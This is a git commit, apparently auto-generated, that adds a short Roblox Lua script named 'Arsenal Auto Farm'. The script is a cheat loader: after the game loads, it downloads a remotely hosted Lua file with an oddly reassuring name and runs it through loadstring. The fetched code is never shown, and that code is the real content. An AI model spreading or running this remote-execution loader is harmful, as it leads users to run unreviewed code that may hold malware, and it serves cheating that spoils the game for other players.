727e94f1b41cac45f6f622a727092a64b46b8a9f
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 12:57:13 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Arsenal Auto Farm.lua
@@ -0,0 +1,4 @@
+getgenv().Rendering = false -- Change it to true if you want it enabled.
+if not game:IsLoaded() then game.Loaded:Wait() end
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iqvf/script/main/newupdatedrealnoscamwindowsupdatelegacylinuxfiles.lua"))()
